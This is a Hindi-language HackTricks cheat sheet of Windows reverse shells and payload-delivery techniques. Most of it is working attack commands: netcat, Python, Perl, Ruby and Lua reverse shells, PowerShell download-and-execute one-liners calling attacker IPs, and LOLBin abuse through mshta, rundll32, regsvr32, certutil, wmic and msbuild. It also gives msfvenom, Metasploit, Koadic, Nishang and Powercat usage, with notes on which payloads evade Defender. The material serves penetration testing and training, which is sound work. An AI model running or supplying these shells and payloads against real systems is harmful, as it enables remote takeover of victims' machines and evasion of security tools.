# Shells - Windows

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे सुरक्षा गड़बड़ी खोजें जो सबसे अधिक मायने रखती है ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक, में मुद्दे खोजता है। [**आज ही मुफ्त में इसे ट्राई करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

पृष्ठ [lolbas-project.github.io](https://lolbas-project.github.io/) विंडोज के लिए है जैसे [https://gtfobins.github.io/](https://gtfobins.github.io/) लिनक्स के लिए है।\
स्वाभाविक रूप से, **विंडोज में SUID फ़ाइलें या सुडो विशेषाधिकार नहीं हैं**, लेकिन यह उपयोगी है जानने के लिए **कैसे** कुछ **बाइनरी** (अ)उपयोग किया जा सकता है कुछ अप्रत्याशित क्रियाएँ करने के लिए जैसे **कोड का अभिव्यक्ति करें।**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** एक Netcat-क्लोन है, जो सुवाह्य होने के लिए डिज़ाइन किया गया है और मजबूत एन्क्रिप्शन प्रदान करने के लिए। यह Unix-जैसे ऑपरेटिंग सिस्टम पर और Microsoft Win32 पर चलता है। sbd में AES-CBC-128 + HMAC-SHA1 एन्क्रिप्शन (Christophe Devine द्वारा), प्रोग्राम निष्पादन (-e विकल्प), स्रोत पोर्ट का चयन, विलंबित पुनरावर्तन जोड़ना, और कुछ अन्य अच्छी सुविधाएँ शामिल हैं। sbd केवल TCP/IP संचार का समर्थन करता है। sbd.exe (Kali linux वितरण का हिस्सा: /usr/share/windows-resources/sbd/sbd.exe) एक Netcat विकल्प के रूप में विंडोज़ बॉक्स पर अपलोड किया जा सकता है।

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## पर्ल
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## रूबी
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## लुआ
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

हम एक नए विंडोज शेल खोलने के लिए OpenSSH का उपयोग कर सकते हैं।

Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
### Victim

शिकार
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
जाल कॉल करने वाली प्रक्रिया: **powershell.exe**\
डिस्क पर लिखी गई पेलोड: **नहीं** (_कम से कम जहां तक मैंने procmon का उपयोग करके खोजा है!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
**एसवीसीहोस्ट.एक्सएचई** प्रक्रिया नेटवर्क कॉल कर रही है।\
डिस्क पर लिखी गई पेलोड: **वेबडैव क्लाइंट स्थानीय कैश**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**इस दस्तावेज़ के अंत में विभिन्न Powershell शैल्स के बारे में अधिक जानकारी प्राप्त करें**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
जाल संपर्क करने वाली प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
mshta http://webserver/payload.hta
```
नेटवर्क कॉल करने वाला प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
mshta \\webdavserver\folder\payload.hta
```
### **नेटवर्क कॉल करने वाली प्रक्रिया: svchost.exe**\
### **डिस्क पर लिखा गया पेलोड: WebDAV client local cache**

#### **hta-psh रिवर्स शैल का उदाहरण (hta का उपयोग करके PS बैकडोर डाउनलोड और चलाने के लिए)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**आप बहुत आसानी से एक Koadic zombie को stager hta का उपयोग करके डाउनलोड और निष्पादित कर सकते हैं**

#### hta उदाहरण

[**यहाँ से**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**यहाँ से**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**डिफेंडर द्वारा पहचाना गया**

## **Rundll32**

[**Dll hello world उदाहरण**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
नेटवर्क कॉल करने वाली प्रक्रिया: **rundll32.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**

**डिफेंडर द्वारा पहचाना गया**

**Rundll32 - sct**

[**यहाँ से**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## रेगिस्ट्री32
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
जांच करने वाली प्रक्रिया: **regsvr32.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
#### रजिस्ट्री सर्वर 32 -sct

[**यहाँ से**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**आप बहुत आसानी से एक Koadic zombie को डाउनलोड और execute कर सकते हैं stager regsvr का उपयोग करके**

## Certutil

एक B64dll डाउनलोड करें, इसे डीकोड करें और execute करें।
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
एक B64exe डाउनलोड करें, इसे डीकोड करें और इसे चलाएं।
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**डिफेंडर द्वारा पहचाना गया**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण सुरक्षा गड़बड़ियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव खतरा स्कैन चलाता है, एपीआई से वेब ऐप्स और क्लाउड सिस्टम जैसे आपके पूरे टेक स्टैक पर मुद्दे खोजता है। [**यह नि: शुल्क ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

*** 

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**डिफेंडर द्वारा पहचाना गया**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
नेटवर्क कॉल करने वाला प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV client local cache**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**डिफेंडर द्वारा पहचाना गया**

## **MSIExec**

हमलावार
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
### शिकारी:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**पहचाना गया**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
नेटवर्क कॉल करने वाली प्रक्रिया: **wmic.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**

उदाहरण xsl फ़ाइल [यहाँ से](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**नहीं पहचाना गया**

**आप आसानी से एक Koadic zombie को डाउनलोड और execute कर सकते हैं उसिंग the stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
प्रक्रिया जो नेटवर्क कॉल कर रही है: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV client local cache**

आप इस तकनीक का उपयोग एप्लिकेशन व्हाइटलिस्टिंग और Powershell.exe प्रतिबंधों को छोड़ने के लिए कर सकते हैं। जैसे ही आपको एक PS शैल मिलेगा।\
बस इसे डाउनलोड करें और इसे चलाएं: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**नहीं पहचाना गया**

## **सीएससी**

विक्टिम मशीन में सीशार्प कोड कंपाइल करें।
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
आप यहाँ से एक मौलिक C# रिवर्स शैल डाउनलोड कर सकते हैं: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**डिटेक्ट नहीं हुआ** 

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

**मैंने इसे नहीं आजमाया है**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
नेटवर्क कॉल करने वाला प्रक्रिया: **svchost.exe**\
डिस्क पर लिखा गया पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

**मैंने इसे नहीं आजमाया है**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell शैल्स

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**शैल्स** फोल्डर में, कई विभिन्न शैल्स हैं। डाउनलोड और क्रियान्वित करने के लिए Invoke-_PowerShellTcp.ps1_ की एक प्रति बनाएं और फ़ाइल के अंत में जोड़ें:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
एक वेब सर्वर में स्क्रिप्ट सर्व करना शुरू करें और पीड़ित के अंत में इसे निष्पादित करें:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender इसे दुष्ट कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).

**TODO: अन्य nishang शैल्स की जाँच करें**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

डाउनलोड करें, एक वेब सर्वर शुरू करें, सुनने वाला शुरू करें, और पीड़ित के अंत में इसे क्रियान्वित करें:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender इसे दुष्ट कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).

**पावरकैट द्वारा प्रस्तावित अन्य विकल्प:**

बाइंड शैल, रिवर्स शैल (TCP, UDP, DNS), पोर्ट रीडायरेक्ट, अपलोड/डाउनलोड, पेलोड उत्पन्न करें, फ़ाइल सर्व करें...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### इम्पायर

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

एक पावरशेल लॉन्चर बनाएं, इसे एक फ़ाइल में सहेजें और उसे डाउनलोड और निष्पादित करें।
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**कोई दुर्भाग्यपूर्ण कोड के रूप में पहचाना गया**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

यूनिकॉर्न का उपयोग करके मेटास्प्लॉइट बैकडोर का पावरशेल संस्करण बनाएं
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
बनाए गए संसाधन के साथ msfconsole शुरू करें:
```
msfconsole -r unicorn.rc
```
वेब सर्वर शुरू करें जो _powershell\_attack.txt_ फ़ाइल को सेवा कर रहा है और पीड़ित में निम्नलिखित को क्रियान्वित करें:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**मालिक को दुर्गंधित कोड के रूप में पहचाना गया**

## अधिक

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल पूर्वानुमानित हैं (साइफर्ड)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल और प्रॉक्सी पहचान है (IEX)

## संदर्भ

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे सुरक्षा गड़बड़ी खोजें जो सबसे अधिक मायने रखती हैं ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरे तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक, में मुद्दे खोजता है। [**मुफ्त में आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड गिटहब रेपो में PR जमा करके।

</details>
